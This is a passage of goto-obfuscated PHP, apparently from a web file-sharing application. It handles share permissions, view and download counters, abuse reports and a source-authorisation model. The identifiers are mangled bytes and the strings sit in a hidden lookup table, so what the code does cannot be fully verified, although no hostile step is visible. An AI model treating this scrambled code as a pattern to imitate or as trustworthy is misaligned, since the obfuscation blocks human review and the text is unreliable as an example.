e²ö—¤Ûöä; e²ö—¤Ûöä: } private function _shareAuthSet($bˆó¦Ò½ó, $FØƒé²óâˆ) { goto bÚ’ŒŞ„—; F†·òëìÄØ: $D‰êˆÌ¹ä->where(array($b‡¨êğ£–Á[419] => $bˆó¦Ò½ó))->delete(); $aÒ¬¨ÛáÀÌ = array(); foreach ($FØƒé²óâˆ as $bˆâÅ¿³ß) { $BŠ¤èÅÍé· = SourceModel::TYPE_USER; if ($bˆâÅ¿³ß[$b‡¨êğ£–Á[393]] == SourceModel::TYPE_GROUP) { $BŠ¤èÅÍé· = SourceModel::TYPE_GROUP; } $D“Ìç¼ƒ• = array($b‡¨êğ£–Á[419] => $bˆó¦Ò½ó, $b‡¨êğ£–Á[393] => $BŠ¤èÅÍé·, $b‡¨êğ£–Á[395] => intval($bˆâÅ¿³ß[$b‡¨êğ£–Á[395]]), $b‡¨êğ£–Á[1680] => 0, $b‡¨êğ£–Á[1681] => -1); if ($bˆâÅ¿³ß[$b‡¨êğ£–Á[1680]]) { $D“Ìç¼ƒ•[$b‡¨êğ£–Á[1680]] = $bˆâÅ¿³ß[$b‡¨êğ£–Á[1680]]; } else { if ($bˆâÅ¿³ß[$b‡¨êğ£–Á[1681]]) { $D“Ìç¼ƒ•[$b‡¨êğ£–Á[1681]] = $bˆâÅ¿³ß[$b‡¨êğ£–Á[1681]]; } } $aÒ¬¨ÛáÀÌ[] = $D“Ìç¼ƒ•; } goto cÁ÷ßøâæ”; cÁ÷ßøâæ”: return $D‰êˆÌ¹ä->addAll($aÒ¬¨ÛáÀÌ, array(), !0); goto EâÙà‰¡ª; bÚ’ŒŞ„—: $b‡¨êğ£–Á =& $_SERVER[İåâé¾]; if (!is_array($FØƒé²óâˆ)) { return !1; } $D‰êˆÌ¹ä = Model($b‡¨êğ£–Á[1679]); goto F†·òëìÄØ; EâÙà‰¡ª: } public function numViewAdd($aˆáÑŞËÖÕ) { $føìó“Øéª =& $_SERVER[İåâé¾]; $FßŒÂÛÊ÷ = array($føìó“Øéª[1678] => $aˆáÑŞËÖÕ); $this->where($FßŒÂÛÊ÷)->setAdd($føìó“Øéª[1674]); } public function numDownloadAdd($F‚ §¿­•–) { $E‘™ÛÒ§ =& $_SERVER[İåâé¾]; $aíŸåƒƒ´Å = array($E‘™ÛÒ§[1678] => $F‚ §¿­•–); $this->where($aíŸåƒƒ´Å)->setAdd($E‘™ÛÒ§[1675]); } protected function shareEdit($eÏ‚À¼À¤, $fš´Ş¼åÅÎ) { goto D”Ó™Üø™ˆ; E›Àø³÷: if (isset($fš´Ş¼åÅÎ[$BÀ´ÚÖŸØÃ[1667]])) { $this->_shareAuthSet($eÏ‚À¼À¤, $fš´Ş¼åÅÎ[$BÀ´ÚÖŸØÃ[1667]]); } return !0; goto dŞÁ‹¢ô£ä; D”Ó™Üø™ˆ: $BÀ´ÚÖŸØÃ =& $_SERVER[İåâé¾]; $cÌ¼êòÊ§ = $this->getInfo($eÏ‚À¼À¤); if (!$cÌ¼êòÊ§) { return !1; } goto bŞº½®Á¾; bŞº½®Á¾: $this->_checkLinkShare($fš´Ş¼åÅÎ, $cÌ¼êòÊ§); $f§ÀóÑèï† = array(); $bÈ”è‚Î…Î = explode($BÀ´ÚÖŸØÃ[47], $BÀ´ÚÖŸØÃ[1682]); goto d‰Ş²¼ˆˆÆ; d‰Ş²¼ˆˆÆ: foreach ($bÈ”è‚Î…Î as $fˆ‚¡‹İˆ) { if (!array_key_exists($fˆ‚¡‹İˆ, $fš´Ş¼åÅÎ)) { continue; } $f§ÀóÑèï†[$fˆ‚¡‹İˆ] = $fš´Ş¼åÅÎ[$fˆ‚¡‹İˆ]; } $this->shareEventAdd($cÌ¼êòÊ§[$BÀ´ÚÖŸØÃ[374]], $fš´Ş¼åÅÎ, $BÀ´ÚÖŸØÃ[1511]); $this->where(array($BÀ´ÚÖŸØÃ[1678] => $eÏ‚À¼À¤))->save($f§ÀóÑèï†); goto E›Àø³÷; dŞÁ‹¢ô£ä: } private function _checkLinkShare($E…†×Ô¸²¨, $Fö£¥„øÈ) { $eÊ¹™Çîé° =& $_SERVER[İåâé¾]; if ($E…†×Ô¸²¨[$eÊ¹™Çîé°[1661]] != $eÊ¹™Çîé°[376] || $Fö£¥„øÈ[$eÊ¹™Çîé°[856]][$eÊ¹™Çîé°[29]] != $eÊ¹™Çîé°[163]) { return; } $F®¨ŒÂÚĞ‘ = Model($eÊ¹™Çîé°[521])->fileInfoGet($Fö£¥„øÈ[$eÊ¹™Çîé°[856]][$eÊ¹™Çîé°[374]]); if (!$F®¨ŒÂÚĞ‘) { return; } $Bï¥®§ßÄ† = $this->shareFileMeta($F®¨ŒÂÚĞ‘[$eÊ¹™Çîé°[382]]); if (isset($Bï¥®§ßÄ†[$eÊ¹™Çîé°[359]]) && $Bï¥®§ßÄ†[$eÊ¹™Çîé°[359]] == $eÊ¹™Çîé°[376]) { show_json(LNG($eÊ¹™Çîé°[1683]), !1); } } protected function remove($eé…ø–©óÆ) { goto e›«Ö¨ç‘à; DõÖ‘‡µ¾‚: for ($A˜½®š•ƒ = 0; $A˜½®š•ƒ < count($f÷·µ——²à); $A˜½®š•ƒ++) { $Eœ•ßôµ³· = $this->getInfo($f÷·µ——²à[$A˜½®š•ƒ]); if ($Eœ•ßôµ³·[$aï©ò‘«¡[417]] == $aï©ò‘«¡[376]) { Model($aï©ò‘«¡[381])->eventShare($Eœ•ßôµ³·[$aï©ò‘«¡[374]], $aï©ò‘«¡[1672]); } if ($Eœ•ßôµ³·[$aï©ò‘«¡[1661]] == $aï©ò‘«¡[376]) { Model($aï©ò‘«¡[381])->eventShare($Eœ•ßôµ³·[$aï©ò‘«¡[374]], $aï©ò‘«¡[1671]); } } return $E„ÌÙ§èáà; goto d¹Ü™Õ–²­; a²®áá”‘: $E„ÌÙ§èáà = $this->where($F¿è…Ç‡Üİ)->delete(); if ($E„ÌÙ§èáà) { Model($aï©ò‘«¡[420])->where(array($aï©ò‘«¡[419] => $eé…ø–©óÆ))->delete(); } $f÷·µ——²à = is_array($eé…ø–©óÆ) ? $eé…ø–©óÆ[1] : array($eé…ø–©óÆ); goto DõÖ‘‡µ¾‚; e›«Ö¨ç‘à: $aï©ò‘«¡ =& $_SERVER[İåâé¾]; if (is_array($eé…ø–©óÆ)) { $eé…ø–©óÆ = array($aï©ò‘«¡[7], $eé…ø–©óÆ); } $F¿è…Ç‡Üİ = array($aï©ò‘«¡[419] => $eé…ø–©óÆ); goto a²®áá”‘; d¹Ü™Õ–²­: } protected function removeBySource($eö£ĞíõŠâ) { goto CÔà¨ĞÛ±»; CÔà¨ĞÛ±»: $F¡çğŸóŠê =& $_SERVER[İåâé¾]; $FŸßÜÅ¼‡ = array($F¡çğŸóŠê[415] => array($F¡çğŸóŠê[1642], $eö£ĞíõŠâ)); $cä×ŞÔˆï = $this->field($F¡çğŸóŠê[419])->where($FŸßÜÅ¼‡)->select(); goto Eé…¡µÓÄŞ; Aâàõù”: $this->where($FŸßÜÅ¼‡)->delete(); Model($F¡çğŸóŠê[420])->where($FŸßÜÅ¼‡)->delete(); goto e·Šî®ŞŒÒ; Eé…¡µÓÄŞ: $cä×ŞÔˆï = array_to_keyvalue($cä×ŞÔˆï, $F¡çğŸóŠê[33], $F¡çğŸóŠê[419]); if (!$cä×ŞÔˆï) { return; } $FŸßÜÅ¼‡ = array($F¡çğŸóŠê[1678] => array($F¡çğŸóŠê[1642], $cä×ŞÔˆï)); goto Aâàõù”; e·Šî®ŞŒÒ: } public function listAll($dÀë‚ĞæÙ) { goto FÊ– ×êìÌ; FÊ– ×êìÌ: $F¶»îÅÎø =& $_SERVER[İåâé¾]; $cÆÚøÌì—Ü = array(); if ($dÀë‚ĞæÙ[$F¶»îÅÎø[1086]]) { $cÆÚøÌì—Ü[$F¶»îÅÎø[1086]] = $dÀë‚ĞæÙ[$F¶»îÅÎø[1086]]; } goto CŒĞŒÎ°°; dçœÏ…ï¥: $Bˆ†½‰…È¹ = $this->_makeOrder()->where($cÆÚøÌì—Ü)->selectPage(20); if (empty($Bˆ†½‰…È¹[$F¶»îÅÎø[356]])) { return array(); } $this->_listDataApply($Bˆ†½‰…È¹[$F¶»îÅÎø[356]]); goto cµ°¡ …Ë; cµ°¡ …Ë: return $Bˆ†½‰…È¹; goto bÁŒÀ¿»áê; CŒĞŒÎ°°: if ($dÀë‚ĞæÙ[$F¶»îÅÎø[459]]) { $D²†‹´õŠ¤ = $dÀë‚ĞæÙ[$F¶»îÅÎø[460]] ? $dÀë‚ĞæÙ[$F¶»îÅÎø[460]] : strtotime(date($F¶»îÅÎø[1684])); $cÆÚøÌì—Ü[$F¶»îÅÎø[186]] = array($F¶»îÅÎø[324], array($dÀë‚ĞæÙ[$F¶»îÅÎø[459]], $D²†‹´õŠ¤)); } if ($dÀë‚ĞæÙ[$F¶»îÅÎø[29]]) { $cÆÚøÌì—Ü[$dÀë‚ĞæÙ[$F¶»îÅÎø[29]]] = 1; } else { $cÆÚøÌì—Ü[] = array($F¶»îÅÎø[1661] => array($F¶»îÅÎø[692], 0), $F¶»îÅÎø[417] => array($F¶»îÅÎø[692], 0), $F¶»îÅÎø[1662] => $F¶»îÅÎø[1635]); } if ($dÀë‚ĞæÙ[$F¶»îÅÎø[1631]]) { $cÆÚøÌì—Ü[] = array($F¶»îÅÎø[1658] => $dÀë‚ĞæÙ[$F¶»îÅÎø[1631]], $F¶»îÅÎø[996] => array($F¶»îÅÎø[520], "\45{$dÀë‚ĞæÙ[$F¶»îÅÎø[1631]]}\45"), $F¶»îÅÎø[1662] => $F¶»îÅÎø[1635]); } goto dçœÏ…ï¥; bÁŒÀ¿»áê: } private function _listDataApply(&$cŞ¹ç—©Áå) { $eø¹‚ï«óµ =& $_SERVER[İåâé¾]; $D¾ºŠË…ò‰ = array_to_keyvalue($cŞ¹ç—©Áå, $eø¹‚ï«óµ[33], $eø¹‚ï«óµ[1086]); $b–”ø›Æ†± = Model($eø¹‚ï«óµ[1477])->userListInfo(array_unique($D¾ºŠË…ò‰)); $AÚí¡“…˜ = array_to_keyvalue($cŞ¹ç—©Áå, $eø¹‚ï«óµ[33], $eø¹‚ï«óµ[374]); $F¥ì‘¨Ğ÷« = Model($eø¹‚ï«óµ[521])->sourceListInfo($AÚí¡“…˜, !0); foreach ($cŞ¹ç—©Áå as &$Eê¿ñÃˆ…ï) { $D‰¸ï˜ø¿ö = $Eê¿ñÃˆ…ï[$eø¹‚ï«óµ[1086]]; $Eê¿ñÃˆ…ï[$eø¹‚ï«óµ[1685]] = $b–”ø›Æ†±[$D‰¸ï˜ø¿ö] ? $b–”ø›Æ†±[$D‰¸ï˜ø¿ö] : !1; $a‘ÕİÑ‹ = $Eê¿ñÃˆ…ï[$eø¹‚ï«óµ[374]]; $Eê¿ñÃˆ…ï[$eø¹‚ï«óµ[856]] = $F¥ì‘¨Ğ÷«[$a‘ÕİÑ‹] ? $F¥ì‘¨Ğ÷«[$a‘ÕİÑ‹] : !1; } } private function _makeOrder($E£‰èÌÈ›Î = '') { goto fËŠ˜³‡’’; fËŠ˜³‡’’: $eÄó™§îÚ =& $_SERVER[İåâé¾]; $BÕèØ¥Üœİ = array($eÄó™§îÚ[186], $eÄó™§îÚ[460], $eÄó™§îÚ[1674], $eÄó™§îÚ[1675]); $E‘›Ç¿·¦ã = array($eÄó™§îÚ[1628] => $eÄó™§îÚ[1629], $eÄó™§îÚ[1509] => $eÄó™§îÚ[1586]); goto CÑëÏ¸Ï²¯; CÑëÏ¸Ï²¯: $aÊçã†áÉ = Input::get($eÄó™§îÚ[1582], $eÄó™§îÚ[7], $eÄó™§îÚ[1583], $BÕèØ¥Üœİ); $B—ˆ°‡µˆ› = Input::get($eÄó™§îÚ[1584], $eÄó™§îÚ[7], $eÄó™§îÚ[1686], array($eÄó™§îÚ[1630], $eÄó™§îÚ[1509])); $B—ˆ°‡µˆ› = $E‘›Ç¿·¦ã[$B—ˆ°‡µˆ›]; goto dš¤Æµëã; dš¤Æµëã: $E£‰èÌÈ›Î = $E£‰èÌÈ›Î . "{$aÊçã†áÉ}\40{$B—ˆ°‡µˆ›}"; return $this->order($E£‰èÌÈ›Î); goto AßÈ¡ğ¿İò; AßÈ¡ğ¿İò: } public function reportAdd($A×±æ §‚Œ) { $B„îˆÍİ® =& $_SERVER[İåâé¾]; $fßå‰«ÎÉ¸ = array($B„îˆÍİ®[419] => $A×±æ §‚Œ[$B„îˆÍİ®[419]], $B„îˆÍİ®[1086] => USER_ID); if (Model($B„îˆÍİ®[1687])->where($fßå‰«ÎÉ¸)->find()) { return !1; } $Cí°æô‹ßò = array($B„îˆÍİ®[419] => $A×±æ §‚Œ[$B„îˆÍİ®[419]], $B„îˆÍİ®[996] => $A×±æ §‚Œ[$B„îˆÍİ®[996]], $B„îˆÍİ®[374] => $A×±æ §‚Œ[$B„îˆÍİ®[374]], $B„îˆÍİ®[382] => $A×±æ §‚Œ[$B„îˆÍİ®[382]], $B„îˆÍİ®[1086] => USER_ID, $B„îˆÍİ®[29] => $A×±æ §‚Œ[$B„îˆÍİ®[29]], $B„îˆÍİ®[1586] => $A×±æ §‚Œ[$B„îˆÍİ®[1586]]); return Model($B„îˆÍİ®[1687])->add($Cí°æô‹ßò); } public function reportList($FÁ³æØİ…µ) { goto FøÚ„„Ø˜; f£­Å¯åŠ: if (empty($bà…óâ±‡º[$BÔöÈ¤İÆ[356]])) { return array(); } $this->_listDataApply($bà…óâ±‡º[$BÔöÈ¤İÆ[356]]); return $bà…óâ±‡º; goto DéÏˆÏÒ ‹; D¾Î½øö’×: $c­¨À¶†Ù¿ = array($BÔöÈ¤İÆ[1628] => $BÔöÈ¤İÆ[1629], $BÔöÈ¤İÆ[1509] => $BÔöÈ¤İÆ[1586]); $eª¶×”è¹ = $BÔöÈ¤İÆ[1691] . $c­¨À¶†Ù¿[$e¸÷Ç‘¼„ƒ]; $bà…óâ±‡º = Model($BÔöÈ¤İÆ[1687])->where($bÓïÑ‚†…)->order($eª¶×”è¹)->selectPage(20); goto f£­Å¯åŠ; D‡İ†·œâœ: if (isset($FÁ³æØİ…µ[$BÔöÈ¤İÆ[29]]) && in_array($FÁ³æØİ…µ[$BÔöÈ¤İÆ[29]], array($BÔöÈ¤İÆ[376], $BÔöÈ¤İÆ[1688], $BÔöÈ¤İÆ[1689], $BÔöÈ¤İÆ[1690], $BÔöÈ¤İÆ[1312]))) { $bÓïÑ‚†…[$BÔöÈ¤İÆ[29]] = $FÁ³æØİ…µ[$BÔöÈ¤İÆ[29]]; } if (isset($FÁ³æØİ…µ[$BÔöÈ¤İÆ[446]]) && in_array($FÁ³æØİ…µ[$BÔöÈ¤İÆ[446]], array($BÔöÈ¤İÆ[402], $BÔöÈ¤İÆ[376], $BÔöÈ¤İÆ[1688], $BÔöÈ¤İÆ[1689]))) { $bÓïÑ‚†…[$BÔöÈ¤İÆ[446]] = $FÁ³æØİ…µ[$BÔöÈ¤İÆ[446]]; } $e¸÷Ç‘¼„ƒ = Input::get($BÔöÈ¤İÆ[1584], $BÔöÈ¤İÆ[7], $BÔöÈ¤İÆ[1686], array($BÔöÈ¤İÆ[1630], $BÔöÈ¤İÆ[1509])); goto D¾Î½øö’×; FøÚ„„Ø˜: $BÔöÈ¤İÆ =& $_SERVER[İåâé¾]; $bÓïÑ‚†… = array(); if ($FÁ³æØİ…µ[$BÔöÈ¤İÆ[459]]) { $Eê½Ï®ËçŠ = $FÁ³æØİ…µ[$BÔöÈ¤İÆ[460]] ? $FÁ³æØİ…µ[$BÔöÈ¤İÆ[460]] : strtotime(date($BÔöÈ¤İÆ[1684])); $bÓïÑ‚†…[$BÔöÈ¤İÆ[186]] = array($BÔöÈ¤İÆ[324], array($FÁ³æØİ…µ[$BÔöÈ¤İÆ[459]], $Eê½Ï®ËçŠ)); } goto D‡İ†·œâœ; DéÏˆÏÒ ‹: } public function reportStatus($fˆ¾ô“ÊÒá) { goto f‡ó‘ÆÈ‘‘; f¨²ùˆÂ„Ğ: $CŞ‚¸ê¶‰Ç = Model($cáíãÜ·©[1687])->where($D±İİ°‘¦)->save($CêÇÂ¹†»); if ($fˆ¾ô“ÊÒá[$cáíãÜ·©[446]] == $cáíãÜ·©[1688]) { if ($E¨‡à±Î—Š[$cáíãÜ·©[382]] != $cáíãÜ·©[402] && $this->shareFileMeta($E¨‡à±Î—Š[$cáíãÜ·©[382]])) { $this->shareFileMeta($E¨‡à±Î—Š[$cáíãÜ·©[382]], 0); } return $this->remove($E¨‡à±Î—Š[$cáíãÜ·©[419]]); } if ($CŞ‚¸ê¶‰Ç && $fˆ¾ô“ÊÒá[$cáíãÜ·©[446]] == $cáíãÜ·©[1689]) { $EåªçÁ‘Úƒ = $CêÇÂ¹†»[$cáíãÜ·©[446]] == $cáíãÜ·©[1689] ? 1 : 0; $this->shareFileMeta($E¨‡à±Î—Š[$cáíãÜ·©[382]], $EåªçÁ‘Úƒ); $this->removeByFile($E¨‡à±Î—Š[$cáíãÜ·©[382]]); } goto F °„¾’Ğ”; dÊ¤ë…ŒÒ: if (!$E¨‡à±Î—Š) { return !1; } $CêÇÂ¹†» = array($cáíãÜ·©[446] => $fˆ¾ô“ÊÒá[$cáíãÜ·©[446]]); if ($fˆ¾ô“ÊÒá[$cáíãÜ·©[446]] == $cáíãÜ·©[1689] && $E¨‡à±Î—Š[$cáíãÜ·©[446]] == $cáíãÜ·©[1689]) { $CêÇÂ¹†»[$cáíãÜ·©[446]] = 0; } goto f¨²ùˆÂ„Ğ; f‡ó‘ÆÈ‘‘: $cáíãÜ·© =& $_SERVER[İåâé¾]; $D±İİ°‘¦ = array($cáíãÜ·©[368] => $fˆ¾ô“ÊÒá[$cáíãÜ·©[368]]); $E¨‡à±Î—Š = Model($cáíãÜ·©[1687])->where($D±İİ°‘¦)->field($cáíãÜ·©[1692])->find(); goto dÊ¤ë…ŒÒ; F °„¾’Ğ”: return $CŞ‚¸ê¶‰Ç; goto A‰è˜íÕ—; A‰è˜íÕ—: } private function removeByFile($b½ó˜¼ÖÖâ) { goto bàÙœÉöäæ; Fëµç¦“: $DÍŒÆ«§İˆ = array($a¦¨¹»¦‡©[374] => array($a¦¨¹»¦‡©[7], $E¿ÛÉ„¦Ç), $a¦¨¹»¦‡©[1661] => 1); $Cã£äÀÏ®Ñ = Model($a¦¨¹»¦‡©[1519])->where($DÍŒÆ«§İˆ)->field($a¦¨¹»¦‡©[419])->select(); $f…ÂÏßš° = array_to_keyvalue($Cã£äÀÏ®Ñ, $a¦¨¹»¦‡©[33], $a¦¨¹»¦‡©[419]); goto E•–Ø£Š†; bàÙœÉöäæ: $a¦¨¹»¦‡© =& $_SERVER[İåâé¾]; $Cã£äÀÏ®Ñ = Model($a¦¨¹»¦‡©[521])->where(array($a¦¨¹»¦‡©[382] => $b½ó˜¼ÖÖâ))->field($a¦¨¹»¦‡©[374])->select(); $E¿ÛÉ„¦Ç = array_to_keyvalue($Cã£äÀÏ®Ñ, $a¦¨¹»¦‡©[33], $a¦¨¹»¦‡©[374]); goto Fëµç¦“; E•–Ø£Š†: $this->remove($f…ÂÏßš°); goto DŸ×ÖšÈŞŒ; DŸ×ÖšÈŞŒ: } private function shareFileMeta($D´Âšœ£ßë, $D«¸›³Óï‘ = null) { $CİÈ¢à¬ÈØ =& $_SERVER[İåâé¾]; $AŒõùÌÑô = array($CİÈ¢à¬ÈØ[382] => $D´Âšœ£ßë, $CİÈ¢à¬ÈØ[88] => $CİÈ¢à¬ÈØ[1693]); if (is_null($D«¸›³Óï‘)) { return Model($CİÈ¢à¬ÈØ[1694])->where($AŒõùÌÑô)->find(); } $AŒõùÌÑô[$CİÈ¢à¬ÈØ[359]] = $D«¸›³Óï‘; Model($CİÈ¢à¬ÈØ[1694])->add($AŒõùÌÑô, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\x63\145\137\x61\x75\x74\150"; public function getAuth($Dâ‡ÛÕÃÚô) { goto a—Æƒ•´‚é; Cİ«†Ê¡ŸÙ: return $eæµÇÕÃ¾¥; goto b„Ó×¬£; a—Æƒ•´‚é: $FÅ¿ÎÌ—Ü† =& $_SERVER[İåâé¾]; $CÄ‰¶—â©¯ = $FÅ¿ÎÌ—Ü†[1695]; $fŸóæï°ö„ = array($FÅ¿ÎÌ—Ü†[374] => $Dâ‡ÛÕÃÚô); goto aĞ¾àäÑÆ÷; aĞ¾àäÑÆ÷: $F²¨ÈºŒŞé = $this->field($CÄ‰¶—â©¯)->order($FÅ¿ÎÌ—Ü†[368])->where($fŸóæï°ö„)->select(); $eæµÇÕÃ¾¥ = array(); foreach ($F²¨ÈºŒŞé as $dîªÎ‹¡) { if (Model($FÅ¿ÎÌ—Ü†[1696])->listData($dîªÎ‹¡[$FÅ¿ÎÌ—Ü†[1680]])) { $eæµÇÕÃ¾¥[] = $dîªÎ‹¡; } } goto Cİ«†Ê¡ŸÙ; b„Ó×¬£: } public function setAuth($AØØœ–°‘¿, $d‘Ñ…—“) { goto e’ø×…ÎóÓ; b­Š­˜Æó: $E¶Ğ•³ = 1; $Dçôå…îãâ = $A¼ƒŠ’[$bÍéæŒ¨¼É[395]]; if ($Dçôå…îãâ != $E¶Ğ•³) { $a ‚“ÊêÍ‹ = array($bÍéæŒ¨¼É[1542] => $Dçôå…îãâ); $d‰´Ê¥ã³ = Model($bÍéæŒ¨¼É[1627])->field($bÍéæŒ¨¼É[1086])->where($a ‚“ÊêÍ‹)->select(); $d‰´Ê¥ã³ = array_to_keyvalue($d‰´Ê¥ã³, $bÍéæŒ¨¼É[33], $bÍéæŒ¨¼É[1086]); } goto c×ÌÔÀ³ù; f®æí¿”È‹: $this->where(array($bÍéæŒ¨¼É[415] => $AØØœ–°‘¿))->delete(); $this->addAll($cÕ­ù¾÷†Â); return !0; goto D¡„½ÒÃ¤¡; c×ÌÔÀ³ù: $b¼›‚Üã¨ª = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $cÕ­ù¾÷†Â = array(); foreach ($d‘Ñ…—“ as $fŒ™”á¡±—) { if (!in_array($fŒ™”á¡±—[$bÍéæŒ¨¼É[393]], $b¼›‚Üã¨ª)) { show_json(LNG($bÍéæŒ¨¼É[1697]), !1); } if ($Dçôå…îãâ != $E¶Ğ•³) { if ($fŒ™”á¡±—[$bÍéæŒ¨¼É[393]] == SourceModel::TYPE_GROUP) { } if ($fŒ™”á¡±—[$bÍéæŒ¨¼É[395]] != 0 && !in_array($fŒ™”á¡±—[$bÍéæŒ¨¼É[395]], $d‰´Ê¥ã³)) { } } if ($fŒ™”á¡±—[$bÍéæŒ¨¼É[395]] == 0) { $fŒ™”á¡±—[$bÍéæŒ¨¼É[393]] = SourceModel::TYPE_USER; } $cÕ­ù¾÷†Â[] = array($bÍéæŒ¨¼É[374] => $AØØœ–°‘¿, $bÍéæŒ¨¼É[393] => intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[393]]), $bÍéæŒ¨¼É[395] => intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[395]]), $bÍéæŒ¨¼É[1680] => intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[1680]]) ? intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[1680]]) : 0, $bÍéæŒ¨¼É[1681] => intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[1681]]) ? intval($fŒ™”á¡±—[$bÍéæŒ¨¼É[1681]]) : -1); } goto f®æí¿”È‹; e’ø×…ÎóÓ: $bÍéæŒ¨¼É =& $_SERVER[İåâé¾]; $A¼ƒŠ’ = Model($bÍéæŒ¨¼É[850])->sourceInfo($AØØœ–°‘¿); if ($A¼ƒŠ’[$bÍéæŒ¨¼É[393]] != SourceModel::TYPE_GROUP) { return !1; } goto b­Š­˜Æó; D¡„½ÒÃ¤¡: } public function authClear($eÙ÷Š·ÊÛ) { $D‘‡½ÇÕÜ« =& $_SERVER[İåâé¾]; $a„˜ÀÁÈ¾» = Model($D‘‡½ÇÕÜ«[850])->sourceInfo($eÙ÷Š·ÊÛ); $aßîŸŒ…¤¥ = array($eÙ÷Š·ÊÛ); if ($a„˜ÀÁÈ¾»[$D‘‡½ÇÕÜ«[375]] == $D‘‡½ÇÕÜ«[376]) { $cœ¥äíõ¨Ô = array($D‘‡½ÇÕÜ«[399] => array($D‘‡½ÇÕÜ«[408], $a„˜ÀÁÈ¾»[$D‘‡½ÇÕÜ«[373]] . $eÙ÷Š·ÊÛ . $D‘‡½ÇÕÜ«[409])); $aßîŸŒ…¤¥ = Model($D‘‡½ÇÕÜ«[850])->field($D‘‡½ÇÕÜ«[415])->where($cœ¥äíõ¨Ô)->getField($D‘‡½ÇÕÜ«[374], !0); $aßîŸŒ…¤¥[] = $eÙ÷Š·ÊÛ; } $this->where(array($D‘‡½ÇÕÜ«[415] => array($D‘‡½ÇÕÜ«[1642], $aßîŸŒ…¤¥)))->delete(); return !0; } public function get($F¦¸£¦Ñ–º) { $Cµ±Ó¨¯Èø = $this->getSourceList(array($F¦¸£¦Ñ–º), !0); return $Cµ±Ó¨¯Èø[0]; } public function getSourceList($Có½î¬ë§á, $B­‘œµˆè = false) { goto AªãÍæ¤ƒ‡; Eî¾Ü¶‡…: $E…­Üæ£í® = array_values(array_unique($E…­Üæ£í®)); if (!$E…­Üæ£í®) { return array(); } $bÎœŠšâŞ = $d‹ìİµ¹†Ø[1699]; goto A±¸¡‡Ñ‰ª; bšŸ½£…ø­: $CªÛñ¶ù¹ = array(); foreach ($B­‘œµˆè as $C†æà¯çÄŠ => $Dˆ”ÑÀ¹Ò‡) { $CªÛñ¶ù¹[$C†æà¯çÄŠ] = $this->makeSourceAuth($Dˆ”ÑÀ¹Ò‡, $EƒòË„); } return $CªÛñ¶ù¹; goto eƒ²†ã‘’; cÔœŸìÍ: if (!$B­‘œµˆè) { $dŞóÓÎ­â = array($d‹ìİµ¹†Ø[415] => array($d‹ìİµ¹†Ø[1642], $Có½î¬ë§á)); $B­‘œµˆè = $E½ª‚·È³Ÿ->field($d‹ìİµ¹†Ø[1698])->where($dŞóÓÎ­â)->select(); $B­‘œµˆè = array_to_keyvalue($B­‘œµˆè, $d‹ìİµ¹†Ø[374]); } $E…­Üæ£í® = $Có½î¬ë§á; foreach ($B­‘œµˆè as $F±¹æéÙìò => $c­ßĞ—…¤ë) { $fÆîó¾ä¥Ò = $E½ª‚·È³Ÿ->parentLevelArray($c­ßĞ—…¤ë[$d‹ìİµ¹†Ø[373]]); $E…­Üæ£í® = array_merge($E…­Üæ£í®, $fÆîó¾ä¥Ò, array($F±¹æéÙìò)); } goto Eî¾Ü¶‡…; A±¸¡‡Ñ‰ª: $dŞóÓÎ­â = array($d‹ìİµ¹†Ø[415] => array($d‹ìİµ¹†Ø[1642], $E…­Üæ£í®)); $EƒòË„ = $this->field($bÎœŠšâŞ)->where($dŞóÓÎ­â)->select(); $EƒòË„ = array_to_keyvalue_group($EƒòË„, $d‹ìİµ¹†Ø[374]); goto bšŸ½£…ø­; AªãÍæ¤ƒ‡: $d‹ìİµ¹†Ø =& $_SERVER[İåâé¾]; if (!$Có½î¬ë§á) { return array(); } $E½ª‚·È³Ÿ = Model($d‹ìİµ¹†Ø[850]); goto cÔœŸìÍ; eƒ²†ã‘’: } public function authDeepCheck($D…æÓ°¬–‚, $c›Ş÷Âë‚Ç = false) { $e«õ÷©§¨› =& $_SERVER[İåâé¾]; if ($GLOBALS[$e«õ÷©§¨›[1021]]) { return !1; } $D²Ûåöö’ = $this->makeAuthDeep(); if (!in_array($D…æÓ°¬–‚, $D²Ûåöö’)) { return !1; } return array($e«õ÷©§¨›[1700] => -1, $e«õ÷©§¨›[1701] => array($e«õ÷©§¨›[812] => $e«õ÷©§¨›[779], $e«õ÷©§¨›[1548] => $e«õ÷©§¨›[402], $e«õ÷©§¨›[387] => LNG($e«õ÷©§¨›[1702]), $e«õ÷©§¨›[1560] => $e«õ÷©§¨›[1703])); } protected function makeAuthDeep() { goto dœÕÁô—µ; D—¬µÚÓ‚: if ($D„÷·æÄ¬å) { $fšÇøšˆ¾ô = array(array($Eğ®¢¦–œ[393] => SourceModel::TYPE_USER, $Eğ®¢¦–œ[395] => USER_ID), array($Eğ®¢¦–œ[393] => SourceModel::TYPE_GROUP, $Eğ®¢¦–œ[395] => array($Eğ®¢¦–œ[1642], $D„÷·æÄ¬å)), $Eğ®¢¦–œ[680] => $Eğ®¢¦–œ[1635]); } if ($bÌŠŒØ¿˜Ö) { $fšÇøšˆ¾ô = array($fšÇøšˆ¾ô, $Eğ®¢¦–œ[1680] => array($Eğ®¢¦–œ[1705], $bÌŠŒØ¿˜Ö)); } $f‹Ú¼¥Û§¯ = $this->field($Eğ®¢¦–œ[1706])->where($fšÇøšˆ¾ô)->select(); goto B’§»”ŠŠ‘; Dñ‡ÛíÔé: $C£¥Öìˆ = Model($Eğ®¢¦–œ[850]); $Eµ“ƒÇø©ö = Model($Eğ®¢¦–œ[1707]); if ($EÅöœ™¼„ù) { $d£Ì‡é„¡‡ = $C£¥Öìˆ->where(array($Eğ®¢¦–œ[374] => array($Eğ®¢¦–œ[1642], $EÅöœ™¼„ù)))->select(); foreach ($d£Ì‡é„¡‡ as $Føëï¥îÊÒ) { $dª¡ö£Š¤ = $C£¥Öìˆ->parentLevelArray($Føëï¥îÊÒ[$Eğ®¢¦–œ[373]]); $E±×Äé× = array_merge($E±×Äé×, $dª¡ö£Š¤); $fãÑø›ˆ¹[] = $Føëï¥îÊÒ[$Eğ®¢¦–œ[395]]; } } goto fÓÓÉèƒ…¶; dœÕÁô—µ: $Eğ®¢¦–œ =& $_SERVER[İåâé¾]; static $E±×Äé× = false; if 